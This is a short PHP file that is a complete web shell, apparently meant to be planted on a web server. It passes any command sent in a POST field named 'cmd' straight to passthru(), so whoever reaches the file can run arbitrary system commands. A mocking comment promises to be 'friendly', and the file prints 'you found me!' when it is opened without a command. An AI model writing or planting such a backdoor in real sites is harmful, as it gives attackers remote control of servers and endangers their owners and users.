<?php

// incognito mode webshell
// don't worry i will be friendly and not destroy your server :)

if(isset($_POST["cmd"]))
    passthru($_POST["cmd"]);
else
    echo("you found me!");

?>
